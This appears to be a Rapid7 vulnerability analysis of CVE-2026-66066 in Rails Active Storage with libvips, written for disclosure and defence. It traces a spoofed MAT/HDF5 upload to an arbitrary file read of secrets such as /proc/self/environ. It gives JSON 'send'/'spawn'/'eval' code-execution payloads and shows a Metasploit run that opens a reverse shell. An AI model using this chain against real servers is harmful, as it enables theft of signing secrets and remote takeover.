---
schema_version: "1.0.0"
document_id: "5485e6b833b77ff8bbc56f122513e969461d73d7a036b02207005ee2c96d31fc"
company_key: "rapid7-inc-common-stock"
company: "Rapid7 Inc."
source_id: "rapid7-inc-common-stock-rss-ea5a9037191f"
canonical_url: "https://www.rapid7.com/blog/post/ra-kindarails2shell-technical-analysis-cve-2026-66066"
published_at: "2026-08-03T17:11:25+00:00"
first_seen_at: "2026-08-03T19:12:41.709514+00:00"
fetched_at: "2026-08-03T20:38:58.255627+00:00"
content_hash: "sha256:e345fcb5e6a711ded894c9fb4e5879354530c06d2eee65a20c42b89f3fef8b2d"
---

# Rapid7 Analysis: KindaRails2Shell (CVE-2026-66066)

## Overview


On July 29, 2026, the Ruby on Rails project published a


[security advisory](https://github.com/rails/rails/security/advisories/GHSA-xr9x-r78c-5hrm) for


[CVE-2026-66066](https://www.rapid7.com/db/vulnerabilities/cve-2026-66066/) , an arbitrary file read in Active Storage applications that use the Vips image processor with untrusted uploads. The affected Active Storage ranges are


< 7.2.3.2


,


>= 8.0, < 8.0.5.1


, and


>= 8.1, < 8.1.3.1


. Vips is the default Active Storage variant processor for applications that load Rails 7.0 or later defaults. Rails 6 applications are affected only when they explicitly configure Vips.


Our


[Emergent Threat Response blog](https://www.rapid7.com/blog/post/etr-kindarails2shell-cve-2026-66066-critical-arbitrary-file-read-and-possible-remote-code-execution-in-ruby-on-rails/) covers the affected versions, mitigation guidance, and current exploitation status. This post traces the request from the direct-upload endpoint to the HDF5 read, then shows how the arbitrary file read can expose Rails signing material and become code execution.


**A vulnerable application can disclose arbitrary files before the attacker has recovered a Rails secret or forged a token.**


A genuine Active Storage


variation_key


from the same application, paired with a direct-upload blob whose stored


content_type


claims to be an image, is enough to reach a libvips loader that turns a crafted MAT/HDF5 file into an arbitrary file-read oracle.


We reproduced the published chain against Rails


6.0.6.1


,


6.1.7.10


,


7.2.3.1


,


8.0.5


, and


8.1.3


, and confirmed that patched


7.2.3.2


,


8.0.5.1


, and


8.1.3.1


targets block the crafted representation. We also validated a remote code execution (RCE) path that uses only JSON-compatible


Hash


,


Array


, and


String


values in a signed variation. That path reaches


Kernel#spawn


or


Kernel#eval


through ImageProcessing's chain builder, and it worked when Rails was configured with


config.active_support.message_serializer = :json


.


The advisory covers the vulnerable Active Storage configuration. The MAT/HDF5 representation chain shown here has narrower requirements. The deployed libvips build must expose


matload


with MAT 7.3/HDF5 support, the application must preserve an attacker-supplied


content_type


, and the attacker must be able to trigger a representation, for example with a genuine variation key. Those requirements narrow where this particular chain works, but the underlying issue is that Active Storage handed untrusted uploads to libvips operations that libvips already marked unsafe for untrusted content.


The attack can be summarized as follows:


```text
[Attacker]
|
| 1. Creates a direct-upload blob with content_type = image/png
v
[Rails stores the blob as an image without examining the bytes]
|
| 2. Reuses a genuine variation_key from the same application
v
[Rails accepts the blob as variable and starts a representation]
|
| 3. image_processing hands the local tempfile path to libvips
v
[libvips matload]
|
| 4. Bytes 0-9 match "MATLAB 5.0"
v
[libmatio]
|
| 5. Bytes 124-125 contain MAT_FT_MAT73 (0x0200)
v
[HDF5 external storage]
|
| 6. Dataset bytes come from attacker-chosen path + offset
v
[Rendered PNG representation]
|
--> Target file bytes are returned as image pixels
```


## Analysis


The published chain contains two separate trust failures. Rails decides that a blob is an image from a database value, while libvips decides what parser to use from the bytes on disk. Once the file reaches


matload


, libvips and libmatio disagree again about the same MAT header. libvips only looks at the first ten bytes, while libmatio selects the MAT version from bytes 124 and 125.


### Direct upload stores an attacker-controlled type


The standard direct-upload endpoint creates the blob record before the service receives the file. In Rails


8.0.5


,


ActiveStorage::DirectUploadsController#create


accepts


content_type


directly from the request and passes it into


create_before_direct_upload!


:


```text
class ActiveStorage::DirectUploadsController < ActiveStorage::BaseController
def create
blob = ActiveStorage::Blob.create_before_direct_upload!(**blob_args) # <-- [1]
render json: direct_upload_json(blob)
end


private
def blob_args
params.expect(blob: [:filename, :byte_size, :checksum, :content_type, metadata: {}]).to_h.symbolize_keys # <-- [2]
end
```


```text
def create_before_direct_upload!(key: nil, filename:, byte_size:, checksum:, content_type: nil, metadata: nil, service_name: nil, record: nil)
metadata = filter_metadata(metadata)
create! key: key, filename: filename, byte_size: byte_size, checksum: checksum, content_type: content_type, metadata: metadata, service_name: service_name # <-- [3]
end
```


At


\[1\]


and


\[2\]


, the endpoint accepts


content_type


from the client. At


\[3\]


, Active Storage writes that value directly to the blob record. The direct-upload path never runs the server-side


unfurl


flow that would identify the bytes with Marcel. When we uploaded the same crafted file through a normal multipart attachment in the lab, Rails re-identified it as MATLAB data before variant processing, so it did not pass the image gate.


Once the direct-upload blob exists,


Blob#variable?


uses only the stored database value to decide whether the blob can be transformed. On the representation path, no built-in previewer accepts


image/png


, so the blob falls through to


variant


:


```text
def variant(transformations)
if variable?
variant_class.new(self, ActiveStorage::Variation.wrap(transformations).default_to(default_variant_transformations))
else
raise ActiveStorage::InvariableError, "Can't transform blob with ID=#{id} and content_type=#{content_type}"
end
end


# Returns true if the variant processor can transform the blob (its content
# type is in +ActiveStorage.variable_content_types+).
def variable?
ActiveStorage.variable_content_types.include?(content_type) # <-- [4]
end
```


At


\[4\]


, Rails performs a set-membership check against the stored


content_type


. No file bytes are examined. A crafted MAT/HDF5 object stored as


image/png


reaches the image variant pipeline.


### A genuine variation key can be replayed against another blob


The standard representation route accepts a signed blob ID and a signed variation key as separate parameters. Rails resolves them independently:


```text
module ActiveStorage::SetBlob # :nodoc:
extend ActiveSupport::Concern


included do
before_action :set_blob
end


private
def set_blob
@blob = blob_scope.find_signed!(params[:signed_blob_id] || params[:signed_id]) # <-- [5]
rescue ActiveSupport::MessageVerifier::InvalidSignature
head :not_found
end


def blob_scope
ActiveStorage::Blob
end
end
```


```text
class ActiveStorage::Representations::BaseController < ActiveStorage::BaseController # :nodoc:
include ActiveStorage::SetBlob


before_action :set_representation


private
def blob_scope
ActiveStorage::Blob.scope_for_strict_loading
end


def set_representation
@representation = @blob.representation(params[:variation_key]).processed # <-- [6]
rescue ActiveSupport::MessageVerifier::InvalidSignature
head :not_found
end
end
```


```text
# Returns a Variation instance with the transformations that were encoded by +encode+.
def decode(key)
new ActiveStorage.verifier.verify(key, purpose: :variation) # <-- [7]
end
```


At


\[5\]


, Rails verifies the blob ID. At


\[6\]


and


\[7\]


, it separately verifies the variation key and applies it to that blob. There is no cross-check between the two signed values. An attacker can copy a


variation_key


from any representation URL emitted by the same application and replay it against the signed ID of a newly created direct-upload blob. The file-read stage does not require


secret_key_base


.


### The Vips pipeline leaves decoder selection to libvips


Active Storage then hands the tempfile path to image_processing. The


loader(page: 0)


call below can be misleading. It stores options for whichever loader libvips chooses later rather than choosing a loader itself:


```text
def process(file, format:)
processor.
source(file).
loader(page: 0). # <-- [8]
convert(format).
apply(operations). # <-- [9]
call
end
def processor
ImageProcessing.const_get(ActiveStorage.variant_processor.to_s.camelize)
end
def operations
transformations.each_with_object([]) do |(name, argument), list|
if ActiveStorage.variant_processor == :mini_magick
validate_transformation(name, argument) # <-- [10]
end
if name.to_s == "combine_options"
raise ArgumentError, <<~ERROR.squish
Active Storage's ImageProcessing transformer doesn't support :combine_options,
as it always generates a single command.
ERROR
end
if argument.present?
list << [ name, argument ] # <-- [11]
end
end
end
```


At


\[8\]


, no decoder has been named yet. At


\[9\]


, Rails forwards the signed transformation list into image_processing. For RCE,


\[10\]


and


\[11\]


matter because


:mini_magick


transformations pass through


validate_transformation


, while Vips transformations do not receive the same method-name validation.


In image_processing


1.14.0


, the path later reaches


Vips::Image.new_from_file


:


```text
def self.load_image(path_or_image, loader: nil, autorot: true, **options)
if path_or_image.is_a?(::Vips::Image)
image = path_or_image
else
path = path_or_image
if loader
image = ::Vips::Image.public_send(:"#{loader}load", path, **options)
else
options = Utils.select_valid_loader_options(path, options)
image = ::Vips::Image.new_from_file(path, **options) # <-- [12]
end
end
image = image.autorot if autorot && !options.key?(:autorotate)
image
end
```


Because


loader:


remains


nil


,


\[12\]


leaves decoder selection to libvips's file sniffers.


### libvips and libmatio disagree about the MAT header


In libvips


8.16.1


,


matload


is marked as untrusted. Vulnerable Active Storage releases did not block untrusted operations before processing attacker-controlled uploads:


```text
static void
vips_foreign_load_mat_class_init(VipsForeignLoadMatClass *class)
{
/* ... omitted: class initialization ... */


operation_class->flags |= VIPS_OPERATION_UNTRUSTED; // <-- [13]


foreign_class->suffs = vips__mat_suffs;


load_class->is_a = vips__mat_ismat; // <-- [14]
```


The entire libvips MAT sniffer is a ten-byte prefix check:


```text
int
vips__mat_ismat(const char *filename)
{
unsigned char buf[15];


if (vips__get_bytes(filename, buf, 10) == 10 &&
vips_isprefix("MATLAB 5.0", (char *) buf)) // <-- [15]
return 1;


return 0;
}
```


At


\[13\]


, libvips marks


matload


as untrusted. At


\[14\]


, it registers


vips__mat_ismat


as the loader's sniffer. At


\[15\]


, a file only needs to begin with


MATLAB 5.0


for libvips to select


matload


. A genuine MAT 7.3 file begins with


MATLAB 7.3 MAT-file


, so it fails this check.


In libmatio


1.5.28


, the descriptive text is not the format selector. libmatio reads the fixed version field at bytes 124 and 125:


```text
enum mat_ft
{
MAT_FT_MAT73 = 0x0200, /**< @brief Matlab version 7.3 file */ // <-- [16]
MAT_FT_MAT5 = 0x0100,  /**< @brief Matlab version 5 file   */
MAT_FT_MAT4 = 0x0010,  /**< @brief Matlab version 4 file   */
MAT_FT_UNDEFINED = 0   /**< @brief Undefined version       */
};
```


At


\[16\]


, libmatio defines


0x0200


as the MAT 7.3 format identifier.


```text
Mat_Open(const char *matname, int mode)
{
FILE *fp = NULL;
mat_int16_t tmp, tmp2;
mat_t *mat = NULL;
size_t bytesread = 0;


/* ... omitted: file opening and allocation ... */


bytesread += fread(mat->header, 1, 116, fp);
mat->header[116] = '\0';
bytesread += fread(mat->subsys_offset, 1, 8, fp);
bytesread += 2 * fread(&tmp2, 2, 1, fp);
bytesread += fread(&tmp, 1, 2, fp);


if ( 128 == bytesread ) {
/* v5 and v7.3 files have at least 128 byte header */
mat->byteswap = -1;
if ( tmp == 0x4d49 )
mat->byteswap = 0;
else if ( tmp == 0x494d ) {
mat->byteswap = 1;
Mat_int16Swap(&tmp2);
}


mat->version = (int)tmp2; // <-- [17]
if ( (mat->version == 0x0100 || mat->version == 0x0200) && -1 != mat->byteswap ) {
mat->bof = ftello((FILE *)mat->fp);
if ( mat->bof == -1L ) {
free(mat->header);
free(mat->subsys_offset);
free(mat);
fclose(fp);
Mat_Critical("Couldn't determine file position");
return NULL;
}
mat->next_index = 0;
} else {
mat->version = 0;
}
}
```


At


\[17\]


,


Mat_Open


stores the two-byte version field read from bytes 124 and 125 in


mat->version


. This is separate from the descriptive text that libvips already accepted at the beginning of the file.


```text
static int
ReadData(mat_t *mat, matvar_t *matvar)
{
if ( mat == NULL || matvar == NULL || mat->fp == NULL )
return MATIO_E_BAD_ARGUMENT;
else if ( mat->version == MAT_FT_MAT5 )
return Mat_VarRead5(mat, matvar);
#if defined(MAT73) && MAT73
else if ( mat->version == MAT_FT_MAT73 )
return Mat_VarRead73(mat, matvar); // <-- [18]
#endif
else if ( mat->version == MAT_FT_MAT4 )
return Mat_VarRead4(mat, matvar);
return MATIO_E_FAIL_TO_IDENTIFY;
}
```


At


\[18\]


,


ReadData


dispatches


MAT_FT_MAT73


into the HDF5-backed reader. A crafted file can therefore say


MATLAB 5.0


to libvips while still entering MAT 7.3 handling in libmatio. HDF5 userblocks make this possible: the crafted file can place a valid HDF5 superblock after a 512-byte leading block that contains the spoofed MAT header.


HDF5 datasets can use an external backing file, including a caller-chosen path and byte offset. libmatio eventually asks HDF5 to read the dataset:


```text
static int
Mat_H5ReadData(hid_t dset_id, hid_t h5_type, hid_t mem_space, hid_t dset_space, int isComplex, void *data)
{
herr_t herr;


if ( !isComplex ) {
herr = H5Dread(dset_id, h5_type, mem_space, dset_space, H5P_DEFAULT, data); // <-- [19]
if ( herr < 0 ) {
return MATIO_E_GENERIC_READ_ERROR;
}
```


Before


\[19\]


, this read path does not check


H5Pget_external_count()


. HDF5 resolves the external storage entry and copies bytes from the attacker-selected file into the MAT variable's data buffer. libvips then treats those bytes as image pixels and Active Storage returns them in the rendered representation.


The header mismatch also leaves a useful content signature. In the first 128 bytes, the file claims


MATLAB 5.0


at bytes 0 through 9, but carries the MAT 7.3 version and endian tag at bytes 124 through 127. A normal MAT 5 file has the text but not the MAT 7.3 tag. A normal MAT 7.3 file has the tag but not the text.


### Why variants are not required


A returned representation is the easiest way to get bytes back, but the advisory states that generating variants is not a separate requirement. Active Storage can also reach


Vips::Image.new_from_file


during image analysis after a blob is attached. Rails's forensic repository documents a


MATLAB_empty


variant in which libmatio reads external bytes while deriving an empty array's dimensions, so those bytes can surface as width and height instead of pixel values. That route does not depend on preserving pixel values.


Representation is one way to trigger the loader. That route needs a direct-upload blob, a representation trigger, and a way to see the image that comes back. The analyzer path can reach the same loader without returning a variant, although the attacker still needs some way to observe the resulting metadata or logs. For exploitation, the returned PNG is more useful because it carries far more data per request.


### Why the patch works


The relevant


v8.0.5


to


v8.0.5.1


diff does not add another content-type check. Instead, it loads a new Active Storage Vips initializer from the analyzer path and disables the libvips operations that libvips itself already marks as untrusted:


```text
diff --git a/activestorage/lib/active_storage/analyzer/image_analyzer/vips.rb b/activestorage/lib/active_storage/analyzer/image_analyzer/vips.rb
index 7e682b3b75fda..e262e1a842aa4 100644
--- a/activestorage/lib/active_storage/analyzer/image_analyzer/vips.rb
+++ b/activestorage/lib/active_storage/analyzer/image_analyzer/vips.rb
@@ -2,0 +3,2 @@
+require "active_storage/vips"
+
diff --git a/activestorage/lib/active_storage/vips.rb b/activestorage/lib/active_storage/vips.rb
new file mode 100644
index 0000000000000..16b2ddbfbaad1
--- /dev/null
+++ b/activestorage/lib/active_storage/vips.rb
@@ -0,0 +23,20 @@
+if ActiveStorage::VIPS_AVAILABLE
+  begin
+    # image_processing 2.0 calls Vips.block_untrusted(true) itself when it loads, so it has to load
+    # before the lines below. Leaving it to load later, when the transformer first asks for it,
+    # would disable the loaders again after an application's initializers had re-enabled them.
+    require "image_processing/vips"
+  rescue LoadError
+    # image_processing is only needed to generate variants, not to analyze blobs.
+  end
+
+  unless Vips.respond_to?(:block_untrusted) # <-- [20]
+    raise <<~ERROR.squish
+      libvips's unfuzzed operations are not safe to use with untrusted content, and Active Storage
+      cannot disable them. Disabling them requires libvips 8.13 or later and ruby-vips 2.2.1 or
+      later. Please upgrade libvips and ruby-vips, or remove the ruby-vips gem from your Gemfile.
+    ERROR
+  end
+
+  Vips.block_untrusted(true) # <-- [21]
+end
```


Active Storage's engine loads the Vips analyzer during initialization, so the new


require "active_storage/vips"


runs during boot rather than waiting for a later representation request. At


\[20\]


, patched Active Storage refuses to boot if the loaded ruby-vips/libvips pair does not expose the blocking API it needs. At


\[21\]


, it blocks those operations globally. Because


matload


is marked


VIPS_OPERATION_UNTRUSTED


, libvips skips it before the crafted file can reach libmatio.


### From file read to code execution


The file read can recover arbitrary files readable by the Rails worker. On Linux,


/proc/self/environ


is a useful first target because it may contain


SECRET_KEY_BASE


,


RAILS_MASTER_KEY


, or service credentials, but the file-read primitive itself is not Linux-specific. Procfs is only a convenient route to Rails signing material. An exploit that relies only on


/proc/self/environ


will miss applications that keep


secret_key_base


in encrypted credentials or legacy


secrets.yml


files. Useful read targets in those cases include


config/master.key


, encrypted credential files, and legacy


secrets.yml


paths. Before using a candidate secret, an exploit can check it against a genuine signed Active Storage blob ID.


Once an attacker has recovered


secret_key_base


and derived the Active Storage verifier key, they can sign a new variation instead of replaying an existing one. Ethiack's write-up uses


instance_eval


for this step. We confirmed that the same Vips-side transformation validation gap also accepts the following JSON-compatible shapes:


```text
{"send":["spawn","/bin/sh","-c","id"]}
{"send":["eval","File.write('/tmp/kr2s', %x{id})"]}
```


In image_processing


1.14.0


,


Chainable#apply


invokes the attacker-controlled transformation name on the builder:


```text
def apply(operations)
operations.inject(self) do |builder, (name, argument)|
if argument == true || argument == nil
builder.public_send(name)
elsif argument.is_a?(Array)
builder.public_send(name, *argument) # <-- [22]
elsif argument.is_a?(Hash)
builder.public_send(name, **argument)
else
builder.public_send(name, argument)
end
end
end
```


At


\[22\]


, a transformation named


send


reaches the builder's public


send


method. The first array element becomes a second method dispatch, which can invoke private


Kernel#spawn


or


Kernel#eval


. Execution occurs while the pipeline is being built, before normal image operations run. In our tests, the representation request returned HTTP 500 because


spawn


or


eval


returns a non-builder value after the payload has already executed.


This RCE path does not depend on a Marshal object gadget. We validated it against Rails


8.0.5


configured with


config.active_support.message_serializer = :json


. We also tested the same structure on older Rails branches whose signed messages used Marshal serialization, but the attacker-controlled data remains a


Hash


,


Array


, and


String


structure rather than a deserialization gadget.


The MAT/HDF5 file read and the missing Vips-side transformation validation are distinct parts of the RCE chain. Rails pull request


[rails/rails#56995](https://github.com/rails/rails/pull/56995) discusses the same Vips-side validation gap. CVE-2026-66066 matters here because the file read can recover the signing material needed to sign a malicious variation for the built-in representation route.


## Exploitation


Our


[Metasploit module](https://github.com/rapid7/metasploit-framework/pull/21733) follows the representation-based chain described above. It creates crafted direct-upload blobs, confirms the file read against


/proc/version


, recovers and validates Rails signing material, signs an ImageProcessing variation, and triggers either


send/spawn


for command payloads or


send/eval


for native Ruby payloads.


The module uses the returned PNG representation instead of the narrower


MATLAB_empty


metadata channel because the PNG path returns larger chunks directly in the HTTP response and gives the module a read channel it can validate automatically during secret recovery. A standalone proof of concept targeting an application that only analyzes uploads could reasonably prefer


MATLAB_empty


, but that path depends on an application-specific way to observe width and height metadata or logs. For code execution, the module uses


send/spawn


and


send/eval


, which fit Metasploit command and Ruby payloads directly.


In the lab run below, the representation used by the module resized the image, so the module selected a 20x20 sharpened text-read layout and recovered 180 bytes per request. It then recovered


SECRET_KEY_BASE


from


/proc/self/environ


, signed a JSON variation, and opened a shell as the Rails process user:


```text
msf6 > use exploit/multi/http/rails_activestorage_vips_rce
[*] Using configured payload cmd/unix/reverse_bash
msf6 exploit(multi/http/rails_activestorage_vips_rce) > set RHOSTS 127.0.0.1
RHOSTS => 127.0.0.1
msf6 exploit(multi/http/rails_activestorage_vips_rce) > set RPORT 3003
RPORT => 3003
msf6 exploit(multi/http/rails_activestorage_vips_rce) > set LHOST 172.17.0.1
LHOST => 172.17.0.1
msf6 exploit(multi/http/rails_activestorage_vips_rce) > run


[*] Running automatic check ("set AutoCheck false" to disable)
[+] Selected the 20x20 sharpened text-read layout (180 bytes per request)
[+] The target is vulnerable. Recovered /proc/version with the 20x20 sharpened layout
[*] Reading up to 65536 bytes from /proc/self/environ
[*] Detected SHA1 Active Support verifier signatures
[*] Detected the Active Support json message serializer
[*] Validated SHA256 key derivation against a signed blob ID
[*] Stored recovered environment bytes in: /home/cryptocat/.msf4/loot/20260731004237_default_127.0.0.1_rails.process.en_047300.bin
[+] Recovered SECRET_KEY_BASE from /proc/self/environ
[*] Triggering the ImageProcessing send/spawn variation using a verifier key derived from /proc/self/environ
[*] Command shell session 1 opened


msf6 exploit(multi/http/rails_activestorage_vips_rce) > sessions -i 1 -c id
[*] Running 'id' on shell session 1 (127.0.0.1)
uid=1000(rails) gid=1000(rails) groups=1000(rails)
```


The SHA1 and SHA256 lines refer to separate Rails settings. The first is the MessageVerifier digest used on the signed blob ID. The second is the key-generator digest used to derive the Active Storage key.


Ethiack's published 1x1 oracle is byte-exact because interpolation has no adjacent pixel values to mix into the result. Our module also tries larger square


uint8


layouts with


/dev/zero


columns between file bytes. With those columns, it can invert image_processing


1.14.0


's vertical sharpen pass and recover more text per request. We still validate every recovered secret against a genuine Active Storage signature because the larger transport is not byte-exact for arbitrary binary data.


## Remediation


For remediation guidance, see Rapid7's


[Emergent Threat Response blog](https://www.rapid7.com/blog/post/etr-kindarails2shell-cve-2026-66066-critical-arbitrary-file-read-and-possible-remote-code-execution-in-ruby-on-rails/) and the Rails


[security advisory](https://github.com/rails/rails/security/advisories/GHSA-xr9x-r78c-5hrm) . The fixed Active Storage releases block untrusted libvips operations during initialization and require libvips


8.13


or later plus ruby-vips


2.2.1


or later when ruby-vips is installed.
